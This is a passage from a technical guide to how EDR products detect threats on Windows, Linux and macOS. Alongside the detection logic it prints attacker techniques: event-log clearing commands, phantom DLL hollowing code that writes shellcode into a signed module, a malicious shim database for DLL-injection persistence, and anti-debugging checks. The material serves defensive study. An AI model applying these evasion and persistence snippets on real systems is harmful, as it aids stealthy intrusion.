- Monitors `execve`, `clone`, `fork`, `ptrace`, `connect`, `sendto`, `mmap`, `mprotect`
- Uses `kprobes` for kernel function entry (more powerful than tracepoints, less stable)
- CO-RE for kernel version compatibility
- Ring buffer for event delivery to user-space agent
- `bpf_send_signal` to kill malicious processes without ptrace overhead

### 34.4 fanotify for File Monitoring

```c
// fanotify: Linux file access notification, used by EDRs for file scanning
int fd = fanotify_init(
    FAN_CLASS_CONTENT |     // receive events about file content
    FAN_CLOEXEC |
    FAN_NONBLOCK,
    O_RDONLY | O_LARGEFILE
);

// Mark filesystem for monitoring
fanotify_mark(fd, FAN_MARK_ADD | FAN_MARK_FILESYSTEM, 
              FAN_OPEN_EXEC_PERM |  // pre-exec notification (blocking!)
              FAN_CLOSE_WRITE,      // post-write notification
              AT_FDCWD, "/");

// Process events in loop:
struct fanotify_event_metadata metadata;
read(fd, &metadata, sizeof(metadata));

if (metadata.mask & FAN_OPEN_EXEC_PERM) {
    // File is about to be executed — we can scan it BEFORE exec
    // Send allow/deny response
    struct fanotify_response response = {
        .fd = metadata.fd,
        .response = FAN_ALLOW  // or FAN_DENY to block execution
    };
    write(fd, &response, sizeof(response));
}
```

### 34.5 Seccomp-BPF for Attack Surface Reduction

While not primarily an EDR technology, seccomp is increasingly used as a defensive layer that EDRs can leverage:

```c
// EDR can enforce seccomp policy on monitored processes
// Block dangerous syscalls that have no legitimate use in specific process contexts:
struct sock_filter filter[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ptrace, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),  // kill process on ptrace
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_process_vm_readv, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),  // kill on cross-process read
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW), // allow everything else
};
```

---

## SECTION 35: Cloud Backend — Behavioral Graph Analysis and ML

### 35.1 The Telemetry Pipeline

```
Endpoint (10,000s of events/sec per machine)
         │
         │ (filtered, deduplicated at sensor)
         ▼
Sensor Service  
  ├── Event fingerprinting (hash key attributes)
  ├── Deduplication (same event pattern → emit once per process session)
  ├── Severity pre-scoring (simple rule matching on sensor)
  ├── Buffering (batch for network efficiency)
  └── Encryption + transport (mTLS to cloud endpoint)
         │
         ▼
Cloud Ingestion Layer
  ├── Event stream processing (Apache Kafka / custom)
  ├── Schema normalization (translate to unified event model)
  ├── Threat intelligence enrichment:
  │     IP → VirusTotal / TI feeds
  │     Hash → malware repositories
  │     Domain → Passive DNS, DGA detection
  └── Write to data lake (Azure ADX / Elastic / Snowflake)
         │
         ▼
Detection Engine (near-real-time)
  ├── Sigma-style behavioral rules (fast, low latency)
  ├── ML sequence models (LSTM / Transformer on process sequences)
  ├── Graph anomaly detection (GNN on process interaction graph)
  └── Alert generation + case management
```

### 35.2 Behavioral Event Graph Model

Events are not analyzed in isolation — they're nodes and edges in a **causal process graph**:

```
Event Graph for a Malware Execution:
  
  [File]──write──►[explorer.exe]──spawn──►[cmd.exe]──spawn──►[powershell.exe]
                                                                    │
                                         ┌──────────────────────────┘
                                         │
                                    allocate────►[MEM_PRIVATE, RWX]
                                         │
                                    inject────────────────────────────►[lsass.exe]
                                         │
                                    connect──────────────────────────►[evil.com:443]
                                         │
                                     write────────────────────────────►[credentials.txt]

Graph-based detection:
  → Path: explorer.exe → cmd.exe → powershell.exe with network + injection
  → Pattern match: TACTIC_EXECUTION + TACTIC_CREDENTIAL_ACCESS + TACTIC_C2
  → MITRE ATT&CK: T1059 + T1055 + T1041
  → Risk score: HIGH
  → Response: Isolate host, alert SOC
```

### 35.3 Machine Learning in EDR Detection

**Models Used:**

| Model Type | Input | Target |
|------------|-------|--------|
| Random Forest | Static PE features (entropy, imports, section count) | Malware/benign classification |
| LSTM / Transformer | Sequence of API calls per process | Shellcode/injection behavior |
| Graph Neural Network | Process interaction graph over 24h | APT campaign detection |
| Isolation Forest | Process behavior feature vector | Anomaly (unsupervised) |
| XGBoost | Composite feature vector | Threat score 0.0-1.0 |

**Feature Engineering for ML:**
```python
# Features extracted per process event sequence:
features = {
    "api_sequence_hash": hash(sorted_api_calls),
    "memory_alloc_count": count(MEM_PRIVATE allocations),
    "cross_process_read_count": count(cross_process ReadVM),
    "network_domain_entropy": shannon_entropy(queried_domains),
    "child_process_count": len(spawned_children),
    "parent_image_name": process_tree.parent.image_name,
    "time_to_network": seconds_from_spawn_to_first_connect,
    "has_valid_pe_signature": bool(pe_signature_valid),
    "process_hollowed": bool(vad_peb_mismatch),
    "callstack_max_private_frames": max(private_frames_per_callstack),
    # ... ~200 features total
}
```

### 35.4 Alert Fatigue Reduction

Production EDR challenge: thousands of events per second per machine × 100,000 machines = billions of events/day. Most are legitimate.

**Reduction strategies:**
- **Event deduplication**: Same behavior pattern → one event per session (Elastic approach)
- **Baseline profiling**: Per-process, per-user behavior baseline; alert only on deviation
- **Whitelist modeling**: Top 10,000 known-clean software signatures never alerted
- **Severity scoring**: Only events above threshold reach analyst queue
- **Alert grouping**: Related events from same host/timeframe → single incident
- **UEBA** (User and Entity Behavior Analytics): User-level baseline; unusual time-of-day / location → escalate
- **AI triage**: LLM-based first-tier alert summarization and initial verdict

---

## SECTION 36: Sensor Data Enrichment Pipeline

### 36.1 From Raw Kernel Event to Enriched Telemetry Record

```c
// Raw kernel event (minimal):
typedef struct _RAW_PROCESS_EVENT {
    ULONG64  Timestamp;        // FILETIME
    ULONG    EventType;        // PROCESS_CREATE
    HANDLE   ProcessId;
    HANDLE   ParentProcessId;
    WCHAR    ImageFileName[16]; // EPROCESS.ImageFileName (15 chars, truncated!)
} RAW_PROCESS_EVENT;

// Enriched event (full):
typedef struct _ENRICHED_PROCESS_EVENT {
    ULONG64  Timestamp;
    ULONG    EventType;
    ULONG    ProcessId;
    ULONG    ParentProcessId;
    
    // Enriched from PEB (read via kernel)
    WCHAR    FullImagePath[MAX_PATH];    // full image file path (from PEB)
    WCHAR    CommandLine[MAX_CMD];       // full command line (from PEB)
    WCHAR    CurrentDirectory[MAX_PATH]; // working directory
    WCHAR    EnvironmentSubset[...];     // PATH, USERNAME, COMPUTERNAME
    
    // Enriched from token
    ULONG    SessionId;
    ULONG    IntegrityLevel;
    WCHAR    UserName[256];
    WCHAR    DomainName[256];
    ULONG64  PrivilegesEnabled;          // privilege bitmask
    
    // Enriched from PE analysis
    UCHAR    ImageHash[32];              // SHA256 of image
    BOOLEAN  IsSignedByMicrosoft;
    WCHAR    SignerName[256];
    ULONG    ImageTimeDateStamp;
    
    // Enriched from EPROCESS
    UCHAR    SignatureLevel;             // EPROCESS.SignatureLevel
    UCHAR    Protection;                 // EPROCESS.Protection (PS_PROTECTION)
    ULONG    MitigationFlags;
    ULONG    MitigationFlags2;
    
    // Process tree context
    ULONG    AncestorPids[MAX_DEPTH];
    WCHAR    AncestorImages[MAX_DEPTH][64];
    
    // MITRE ATT&CK preliminary tagging
    ULONG    SuspiciousTechniqueFlags;  // bitmask of suspected techniques
    FLOAT    RiskScore;                 // 0.0 to 1.0 from on-sensor ML
} ENRICHED_PROCESS_EVENT;
```

### 36.2 Hash Calculation at File Open

The minifilter pre-op for IRP_MJ_CREATE is the optimal point to calculate file hash:

```c
FLT_PREOP_CALLBACK_STATUS PreCreateCallback(
    PFLT_CALLBACK_DATA Data,
    PCFLT_RELATED_OBJECTS FltObjects,
    PVOID *CompletionContext
) {
    // Check if opening for execution (EXECUTE access, image section)
    if (Data->Iopb->Parameters.Create.SecurityContext->DesiredAccess & FILE_EXECUTE) {
        // Queue hash calculation to worker thread (avoid blocking IRP)
        QueueHashWorkItem(FltObjects->FileObject, HASH_SHA256);
    }
    return FLT_PREOP_SUCCESS_WITH_CALLBACK;
}

// Worker thread: calculate SHA256
VOID HashWorker(PVOID Parameter) {
    HASH_WORK_ITEM *item = (HASH_WORK_ITEM*)Parameter;
    
    // Read file via FltReadFile (minifilter-safe read)
    UCHAR buffer[4096]; ULONG bytesRead;
    LARGE_INTEGER offset = {0};
    SHA256_CONTEXT ctx;
    SHA256Init(&ctx);
    
    while (FltReadFile(item->Instance, item->FileObject, &offset,
                       sizeof(buffer), buffer, 0, &bytesRead, NULL, NULL) == STATUS_SUCCESS) {
        SHA256Update(&ctx, buffer, bytesRead);
        offset.QuadPart += bytesRead;
        if (bytesRead < sizeof(buffer)) break;
    }
    
    SHA256Final(&ctx, item->Hash);
    StoreHashInProcessContext(item->ProcessId, item->Hash);
}
```

---

## SECTION 37: macOS EDR — Endpoint Security Framework

### 37.1 ESF Architecture

Apple's Endpoint Security Framework (introduced macOS 10.15 Catalina) replaced the deprecated `kauth` and KextAuth APIs:

```
macOS Endpoint Security Architecture:

  User-mode process
      │
  System Call
      │
  XNU Kernel
      ├── VFS layer
      ├── Process management
      └── Network stack
           │ (ESF message generation)
           ▼
      es_client (kernel side)
           │
           │ (Mach messages)
           ▼
      ESF daemon (user-space, SIP-protected, Hardened Runtime)
           │
      Endpoint Security API (libEndpointSecurity.dylib)
           │
      EDR Agent (3rd party, must be entitled + notarized)
```

### 37.2 ESF Event Types

```c
// ES event types (partial list from <EndpointSecurity/ESTypes.h>):
typedef enum {
    ES_EVENT_TYPE_AUTH_EXEC,           // process execution (blocking)
    ES_EVENT_TYPE_AUTH_OPEN,           // file open (blocking)
    ES_EVENT_TYPE_AUTH_KEXTLOAD,       // kernel extension load (blocking)
    ES_EVENT_TYPE_AUTH_MMAP,           // memory mapping (blocking)
    ES_EVENT_TYPE_AUTH_MPROTECT,       // memory protection (blocking)
    ES_EVENT_TYPE_AUTH_MOUNT,          // filesystem mount (blocking)
    ES_EVENT_TYPE_AUTH_RENAME,         // file rename (blocking)
    ES_EVENT_TYPE_AUTH_SIGNAL,         // signal delivery (blocking)
    ES_EVENT_TYPE_AUTH_UNLINK,         // file deletion (blocking)
    ES_EVENT_TYPE_NOTIFY_EXEC,         // post-exec notification
    ES_EVENT_TYPE_NOTIFY_FORK,         // process fork
    ES_EVENT_TYPE_NOTIFY_EXIT,         // process exit
    ES_EVENT_TYPE_NOTIFY_CREATE,       // file creation
    ES_EVENT_TYPE_NOTIFY_WRITE,        // file write
    ES_EVENT_TYPE_NOTIFY_CLOSE,        // file close
    ES_EVENT_TYPE_NOTIFY_READLINK,     // readlink
    ES_EVENT_TYPE_NOTIFY_SETUID,       // setuid
    ES_EVENT_TYPE_NOTIFY_SETGID,       // setgid
    ES_EVENT_TYPE_NOTIFY_IOKIT_OPEN,   // IOKit device open
    // ... 60+ event types total
} es_event_type_t;
```

### 37.3 Gatekeeper and Notarization as Detection Layer

```
File Execution on macOS:
  1. User opens file / browser downloads file
  2. Gatekeeper checks quarantine xattr (com.apple.quarantine)
  3. If quarantined → Gatekeeper scans:
     a. Code signature verification (codesign)
     b. Notarization check (Apple servers: ticket validation)
     c. Malware scan (XProtect YARA rules)
  4. If signed + notarized + clean → allow
  5. If any check fails → block + alert user

Notarization:
  → Developer submits binary to Apple for notarization
  → Apple scans for malware, validates signing certificate
  → Staples notarization ticket to binary
  → Even offline: system can verify stapled ticket
```

---

## SECTION 38: Anti-Forensics and Log Tampering Detection

### 38.1 Windows Event Log Tampering

```c
// Attack: Clear event logs to hide intrusion
// wevtutil cl Security   ← clears Security log
// wevtutil cl System     ← clears System log
// Clear-EventLog -LogName Security

// Detection (ironic: the clear event ITSELF is logged):
// Security EventID 1102: "The audit log was cleared"
// System EventID 104:    "The System log file was cleared"
// These events are ALWAYS logged in Security log (cannot be suppressed)

// EDR Detection:
// PsSetCreateProcessNotifyRoutine: wevtutil.exe + "cl" argument
// API hook: EvtClearLog() / EvtDeleteLog() function calls
// Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\*\Enabled = 0
// ETW: EtwEventWrite for eventlog-clear operations

// More sophisticated attack: corrupt the log file directly
// Attack: NtCreateFile(Security.evtx) → NtWriteFile(garbage bytes)
// Detection: minifilter write to C:\Windows\System32\winevt\Logs\*.evtx by non-evtlog process
// Event log service DACL should prevent this → BYOVD required
```

### 38.2 Timestamp Manipulation

```c
// Timestomping: modify file timestamps to confuse forensics timeline
// NtSetInformationFile(handle, FileBasicInformation, ...)
// Sets: CreationTime, LastAccessTime, LastWriteTime, ChangeTime

// Detection:
// MFT (Master File Table) stores TWO sets of timestamps:
//   $STANDARD_INFORMATION (user-visible, stampable)
//   $FILE_NAME (updated by NTFS kernel, harder to stamp)
// Discrepancy between $SI and $FN timestamps → timestomping detected!

// Minifilter detection:
// IRP_MJ_SET_INFORMATION with FileBasicInformation on executables → alert
// Compare $SI timestamps against $FN via FltQueryInformationFile

// Prefetch / USN Journal:
// NTFS USN (Update Sequence Number) Journal records all file operations
// Even if timestamps are modified, USN journal shows WHEN modification occurred
// EDR can cross-reference file timestamps against USN journal entries
```

### 38.3 Process History Reconstruction

Even if an attacker deletes all process artifacts, EDR can reconstruct history from:

```
Forensic Artifacts for Process Reconstruction:
  1. Prefetch files (C:\Windows\Prefetch\*.pf)
     → Tracks execution of every process (last 8 run times)
     → EDR monitors prefetch directory for new/modified entries

  2. Shimcache (AppCompatCache)
     → HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
     → Records every executed binary + last modification time

  3. AmCache.hve (Application Cache)
     → HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppModel\Repository
     → Records: path, size, hash, first/last execution time

  4. UserAssist registry
     → Tracks GUI application launches via HKCU\...\UserAssist

  5. SRUM (System Resource Usage Monitor)
     → C:\Windows\System32\sru\SRUDB.dat
     → 30 days of per-application network/compute usage

  6. ETW trace files (if circular logging enabled)
     → NT Kernel Logger: process creation, file I/O, network

  7. Windows Error Reporting (WER)
     → C:\ProgramData\Microsoft\Windows\WER\ReportQueue\
     → Crash dumps with full process context
```

---

## SECTION 39: Supply Chain and DLL Sideloading Detection

### 39.1 DLL Search Order Hijacking

Windows DLL search order:
```
1. Application directory (EXE directory)   ← HIJACKING TARGET
2. System32 directory
3. System directory (syswow64 on x64)
4. Windows directory
5. Current working directory              ← HIJACKING TARGET
6. PATH environment variable directories
```

**Attack**: Drop malicious `version.dll` / `winhttp.dll` / `dbghelp.dll` in same directory as legitimate application → application loads malicious DLL instead of system one.

**EDR Detection:**
```
1. PsSetLoadImageNotifyRoutine fires on every DLL load
   → Check: is DLL path in system32? NO → suspicious
   → Check: is DLL signed? NO → very suspicious
   → Check: is DLL in expected search path for this process? Check manifest

2. Minifilter IRP_MJ_CREATE for DLL load:
   → Cross-reference: is this DLL expected by process manifest?
   → Check: is known application loading a DLL from unusual path?
   → Database of (app_name → expected_dlls) for common software

3. Hash comparison:
   → SHA256 of loaded DLL ≠ SHA256 of system32 version → ALERT

4. Signature check:
   → EPROCESS.SectionSignatureLevel + ImageInfo.ImageSignatureLevel
   → Unsigned DLL loaded into signed process → alert

5. Behavioral: DLL loaded during application startup from non-system path
   → Especially: version.dll, winhttp.dll, userenv.dll, dbghelp.dll
   → These are commonly targeted (wide compatibility, rarely in app dir)
```

### 39.2 Supply Chain Injection (3CX Style, 2023)

```
3CX Supply Chain Attack:
  1. Compromise 3CX build system
  2. Inject malicious code into legitimate 3CX DLL (ffmpeg.dll)
  3. Sign malicious DLL with legitimate 3CX certificate
  4. Distribute via normal 3CX update channel
  
  The signed-DLL defense fails:
  → DLL is legitimately signed by 3CX
  → Hash matches vendor-distributed version
  → Traditional detection: BLIND
  
  How modern EDR catches it:
  → Behavioral: ffmpeg.dll making network connections to C2 domains
  → DLL executes code not in typical audio processing patterns
  → Process graph: 3CX.exe → ffmpeg.dll → network → download → exec
  → Threat intel: C2 domain in blocklist (reactive but common)
  → ML: API call sequence of ffmpeg.dll deviates from baseline
  → Memory: decrypted payload visible in memory scan after execution
```

### 39.3 Phantom DLL Hollowing

A refinement of module stomping that's harder to detect via disk-comparison:

```c
// Step 1: Load a legitimate DLL that's "phantom" - exists but rarely used
HMODULE hPhantem = LoadLibrary("C:\\Windows\\System32\\txttool.exe");
// Or load from WinSxS: guaranteed-signed, multiple versions

// Step 2: Find its .text section
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hPhantem;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)dosHeader + dosHeader->e_lfanew);
PIMAGE_SECTION_HEADER textSection = /* find .text section */;

// Step 3: Change to writable, write payload
VirtualProtect(textBase, textSize, PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(textBase, shellcode, shellcode_size);
VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt);

// Why this defeats simple disk-comparison EDR:
// → DLL is still listed in PEB.Ldr (looks legitimate)
// → Section type is still MEM_IMAGE (not MEM_PRIVATE)
// → Disk copy still intact (modification is only in copied CoW page)

// Why modern EDR catches it:
// → ETW-TI THREATINT_PROTECTVM_LOCAL fires on VirtualProtect change
// → Memory comparison: CoW'd page differs from original backing file
// → MEM_IMAGE page with non-file-backed content (copy-on-write divergence)
// → Only text section differs; code signature verification fails
```

---

## SECTION 40: Network EDR — DNS, TLS, and Deep Packet Inspection

### 40.1 DNS Monitoring Architecture

DNS is a critical detection point because:
- Nearly every network connection requires DNS resolution
- C2 callbacks often use DGA (Domain Generation Algorithms) or high-entropy subdomains
- DNS tunneling exfiltrates data in DNS queries themselves
- Malware frequently queries known-bad domains

**How EDR monitors DNS:**

```
Layer 1: User-mode hook on DNS APIs
  → DnsQuery_A / DnsQuery_W (dnsapi.dll)
  → Hook captures: queried name, query type, result IPs
  → Limitation: bypassed by raw socket DNS (send UDP to 8.8.8.8 directly)

Layer 2: WFP callout at transport layer
  → FWPM_LAYER_DATAGRAM_DATA_V4: intercept UDP packets to port 53
  → Parse DNS wire format: extract query name, query type, answers
  → Full packet content available (not just API layer)
  → Captures: raw DNS, DoH (if using known DoH servers), DNS over TCP

Layer 3: Windows DNS Client ETW provider
  → Provider: Microsoft-Windows-DNS-Client (GUID: 1c95126e-7eea-49a9-a3fe-a378b03ddb4d)
  → Events: DNS query issued, DNS response received, cache hit/miss
  → Available without any hooks
  → Limitation: only for DNS Client service; processes bypassing DNS Client missed

Layer 4: Cloud-side DNS enrichment  
  → Passive DNS reputation: is domain < N days old?
  → Threat intel feeds: known-bad domains, malware C2, phishing
  → DGA detection: ML model on domain name entropy + NXD rate
  → PDNS correlation: same IP hosting 100+ domains = suspicious
```

### 40.2 DGA (Domain Generation Algorithm) Detection

```python
# ML-based DGA detection features:
def extract_dga_features(domain: str) -> dict:
    return {
        # Lexical features
        "length": len(domain),
        "entropy": shannon_entropy(domain),
        "digit_ratio": sum(c.isdigit() for c in domain) / len(domain),
        "consonant_ratio": count_consonants(domain) / len(domain),
        "max_consonant_seq": max_consecutive_consonants(domain),
        
        # N-gram features (compare against legitimate domain language model)
        "bigram_probability": language_model.score_bigrams(domain),
        "trigram_probability": language_model.score_trigrams(domain),
        
        # Structural features
        "subdomain_count": domain.count('.'),
        "tld_commonness": tld_frequency[get_tld(domain)],
        "has_known_brand": any(brand in domain for brand in brand_list),
        
        # Reputation (requires lookup)
        "domain_age_days": whois_age(domain),
        "alexa_rank": alexa_rank(domain),  # -1 if not ranked
    }
    
# Threshold: DGA probability > 0.85 → alert (typical false positive rate < 0.1%)
# Examples:
# "google.com" → DGA prob: 0.01
# "a8s7df2k3j.com" → DGA prob: 0.97 (random-looking)
# "update-microsoft-security.net" → DGA prob: 0.62 (mixed, context matters)
```

### 40.3 DNS Tunneling Detection

```
DNS Tunneling Indicators:
  
  Volume: legitimate DNS queries = 10-100/minute per process
          DNS tunnel: 100-10000+ queries/minute
          
  Query type: legitimate = A, AAAA, MX, CNAME, PTR
              tunnel often = TXT (can hold arbitrary data up to 512 bytes)
                             NULL (less common)
                             A with encoded data in subdomain
                             
  Subdomain length: legitimate = < 40 chars (usually < 20)
                   tunnel: 60-255 chars (max label length)
                   example: "aGVsbG8gd29ybGQ.attacker.com" (base64 in subdomain)
  
  Query entropy: legitimate domains have low entropy
                 tunnel subdomains: high entropy (encoded data)
                 
  NX response rate: legitimate clients: < 5% NXDOMAIN
                    DGA/tunnel: potentially > 80% NXDOMAIN (unreachable C2)

Detection Implementation:
  WFP callout captures all DNS traffic
  → Per-process DNS statistics tracked (query rate, subdomain entropy, NX rate)
  → Alert thresholds:
     query_rate > 500/min → DNS_TUNNEL_SUSPICION
     avg_subdomain_entropy > 4.0 bits → HIGH_ENTROPY_DNS
     nxdomain_rate > 0.7 → DGA_BEACON_PATTERN
```

### 40.4 TLS Inspection Without MITM

True TLS decryption requires the private key or MiTM proxy. But EDR can observe:

```
Observable TLS Metadata (without decryption):
  
  1. JA3 Fingerprint (Client Hello → MD5):
     → TLS version, cipher suites, extensions, elliptic curves
     → Same malware family = same JA3 fingerprint (tooling-specific)
     → Known-bad JA3: Cobalt Strike default, Metasploit, custom RATs
     → JA3S: server response fingerprint
     
  2. Certificate inspection:
     → Server certificate: CN, SAN, issuer, validity period, key size
     → Self-signed certificate to public IP → suspicious
     → Certificate issued < 24h ago + new domain → suspicious
     → Let's Encrypt cert to non-FQDN → suspicious
     
  3. SNI (Server Name Indication):
     → Unencrypted in TLS ClientHello (until TLS 1.3 ECH)
     → Reveals requested hostname even without decryption
     
  4. Connection patterns:
     → Periodic beaconing (connect every N seconds) → C2 beacon
     → Small, regular data exchanges → heartbeat pattern
     → Jitter analysis: randomized interval (±20%) = C2 evasion
     
  5. Certificate Transparency log correlation:
     → New cert + new domain + no CT log entry → suspicious
     
  6. ALPN (Application Layer Protocol Negotiation):
     → Malware over HTTP/2 vs expected HTTP/1.1 for that port
```

### 40.5 Encrypted C2 Beacon Detection (Behavioral)

```
Beacon Detection Algorithm:
  
  For each process with network activity:
    intervals = [t2-t1, t3-t2, t4-t3, ...]  (time between connections)
    
    if len(intervals) >= 5:
        jitter = std_deviation(intervals) / mean(intervals)
        if jitter < 0.3:  # very regular → beacon pattern
            emit SUSPICIOUS_BEACONING
    
    if mean(intervals) in [60, 120, 300, 600]:  # common C2 sleep times
        emit KNOWN_BEACON_INTERVAL
        
    # Cobalt Strike specific:
    # Default sleep: 60s ±0% jitter → jitter = 0.0
    # CS beacon data sizes: ~4KB responses, 100-500B requests
    if (jitter < 0.05 and 
        mean(payload_sizes) < 1000 and 
        connection_count > 10):
        emit COBALT_STRIKE_BEACON_PATTERN
```

---

## SECTION 41: Kernel Shim Engine — Legitimate Feature, Abused for Persistence

### 41.1 Application Compatibility Database

The Windows Shim Engine (`apphelp.dll` / `shimeng.dll`) provides application compatibility fixes. It can inject DLLs into processes, redirect API calls, or modify process behavior at load time.

**Shim database location:**
```
System SDB: C:\Windows\AppPatch\sysmain.sdb
Custom SDB: C:\Windows\AppPatch\Custom\*.sdb
             HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
             HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\
```

### 41.2 InjectDLL Shim — The Injection Vector

```c
// Creating a malicious SDB that injects a DLL into every process:
// (This was used by Duqu APT and documented by FireEye)

// SDB XML equivalent (actual format is binary):
<DATABASE>
  <APP NAME="Malware Persistence" VENDOR="Attacker">
    <EXE NAME="*.exe">   <!-- Match ALL executables -->
      <SHIM NAME="InjectDll">
        <DATA NAME="DllName" VALUETYPE="SZ" VALUE="C:\evil.dll"/>
      </SHIM>
    </EXE>
  </APP>
</DATABASE>

// Install:
sdbinst.exe malicious.sdb
// Registers SDB in registry, DLL injected into EVERY new process

// Why this is stealthy:
// → DLL injection happens via legitimate Windows shim engine
// → PsSetLoadImageNotifyRoutine fires (DLL visible to EDR)
// → BUT: DLL appears to come from "AppPatch compatibility" not explicit injection
// → Some EDR products whitelisted shim-injected DLLs historically
```

### 41.3 EDR Detection of Shim Abuse

```c
// Detection vectors:
// 1. CmRegisterCallbackEx: monitor SDB installation keys
//    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
//    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\

// 2. PsSetLoadImageNotifyRoutine: DLL loaded via shim
//    ImageInfo.ImageMappedToAllPids = FALSE but loaded into non-standard paths
//    DLL path not matching normal install locations for that application

// 3. Minifilter: sdbinst.exe writing to AppPatch directories
//    IRP_MJ_CREATE on C:\Windows\AppPatch\Custom\* by non-system process

// 4. Process: sdbinst.exe execution with custom .sdb file
//    PsSetCreateProcessNotifyRoutine: sdbinst.exe + non-standard args

// 5. Static SDB analysis:
//    Parse installed SDB files; flag any with InjectDll shim targeting *
//    Compare SDB hash against known-good database
```

---

## SECTION 42: Smart App Control and AI-Based Reputation

### 42.1 Smart App Control (SAC) Architecture

Introduced in Windows 11 22H2, Smart App Control is Microsoft's AI-based binary reputation system integrated directly into the OS:

```
Smart App Control Flow:
  Binary about to execute (or DLL load)
           │
           ▼
  CI.dll (Code Integrity) checks:
  1. Is binary signed by trusted publisher? → ALLOW
  2. Is binary in Microsoft Intelligent Security Graph (ISG) as "trusted"? → ALLOW
  3. Neither → BLOCK (or warn in evaluation mode)
           │
           ▼
  ISG lookup (cloud query):
  → Hash submitted to Microsoft cloud
  → Response: TRUSTED / UNKNOWN / MALICIOUS
  → TRUSTED: seen many times, no threat intel hits
  → Cached result: valid for hours to avoid latency
```

### 42.2 SAC Interaction with EDR

```
SAC and EDR are complementary:
  SAC: broad reputation-based blocking (hash-focused)
  EDR: behavioral detection (activity-focused)
  
  SAC limitations:
  → Only blocks unknown files (trusted = pass, zero knowledge)
  → Supply chain attacks (3CX, SolarWinds): binary IS trusted → SAC passes
  → Living-off-the-land: legitimate binaries (certutil, mshta) are trusted
  → In-memory attacks: no file → SAC not triggered
  
  EDR fills the gaps:
  → Even SAC-trusted binaries monitored behaviorally
  → In-memory attacks detected by ETW-TI, VAD analysis
  → LOLBin misuse detected by behavioral patterns
  
  SAC + WDAC + EDR = layered defense (defense in depth)
```

### 42.3 WDAC (Windows Defender Application Control) Policies

```xml
<!-- Example WDAC policy allowing only Microsoft-signed drivers -->
<SiPolicy xmlns="urn:schemas-microsoft-com:sipolicy">
  <Rules>
    <Rule>
      <Option>Enabled:UMCI</Option>  <!-- User Mode Code Integrity -->
    </Rule>
    <Rule>
      <Option>Enabled:Boot Menu Protection</Option>
    </Rule>
  </Rules>
  <FileRules>
    <!-- Block specific known-vulnerable drivers -->
    <Deny ID="ID_DENY_RTCORE64" FriendlyName="RTCore64.sys"
          Hash="1A4E0EF678C8B82756AA3A9E3AAF1A8B6E549C82"/>
    <Deny ID="ID_DENY_GDRV" FriendlyName="gdrv.sys"
          Hash="31F4CFDB61E17D459D5F05E7AE8B4C1C..."/>
  </FileRules>
  <Signers>
    <!-- Allow only WHQL-signed drivers -->
    <Signer ID="ID_SIGNER_WHQL" Name="Microsoft Windows Hardware Compatibility Publisher">
      <CertRoot Type="TBS" Value="..."/>
    </Signer>
  </Signers>
</SiPolicy>
```

---

## SECTION 43: Anti-Debugging Detection by EDR

### 43.1 Why Anti-Debugging Matters for EDR

Malware uses anti-debugging techniques to:
1. Detect if it's running in an EDR sandbox (detonation environment)
2. Prevent analysis by security researchers
3. Detect if debugger is attached (triggers evasive behavior)

**EDR perspective**: detecting *anti-debugging checks* is itself a detection signal — legitimate software rarely checks for debuggers.

### 43.2 Common Anti-Debugging Checks

**User-mode level (easily detectable via hook):**
```c
// 1. IsDebuggerPresent (trivial)
BOOL debugged = IsDebuggerPresent();  // reads PEB.BeingDebugged

// 2. CheckRemoteDebuggerPresent
BOOL result; 
CheckRemoteDebuggerPresent(GetCurrentProcess(), &result);

// 3. NtQueryInformationProcess
ULONG debugPort;
NtQueryInformationProcess(GetCurrentProcess(), 
                          ProcessDebugPort,  // class 7
                          &debugPort, sizeof(ULONG), NULL);
// Returns non-zero if debugger attached

// 4. NtQueryInformationProcess - DebugFlags
ULONG noDebug;
NtQueryInformationProcess(GetCurrentProcess(),
                          ProcessDebugFlags,  // class 31
                          &noDebug, sizeof(ULONG), NULL);
// Returns 0 if debugger present

// 5. ProcessDebugObjectHandle
HANDLE hDebug;
NtQueryInformationProcess(GetCurrentProcess(),
                          ProcessDebugObjectHandle,  // class 30
                          &hDebug, sizeof(HANDLE), NULL);
// Non-null if debug object attached

// 6. Heap flag check (classic)
PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
ULONG heapFlags = *(ULONG*)((PUCHAR)peb->ProcessHeap + 0x70);
if (heapFlags & 0x50000060) { /* debugger detected */ }

// 7. Timing check (RDTSC delta)
ULONG64 t1 = __rdtsc();
/* some operation */
ULONG64 t2 = __rdtsc();
if (t2 - t1 > THRESHOLD) { /* being debugged (single-step slows execution) */ }

// 8. Parent process check
// In debugger: parent = debugger.exe
// Normal: parent = explorer.exe / cmd.exe
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
// walk processes, find own entry, check parent name
```

**EDR Detection of Anti-Debug Checks:**
```
Every NtQueryInformationProcess(ProcessDebugPort/DebugFlags/DebugObjectHandle)
  → EDR hook logs: PROCESS_DEBUG_CHECK
  → Legitimate software almost never checks own debug status
  → Alert: "Process performing debugger detection" → sandbox evasion

RDTSC-based timing: detectable if extremely frequent (>1000/sec)
  → Hardware performance counter anomaly
  → Intel TDT can observe RDTSC instruction frequency
```

### 43.3 EDR Sandbox Detection Evasion by Malware

Malware increasingly detects that it's running inside an EDR sandbox:

```c
// 1. Sleep check: EDR sandboxes often accelerate time
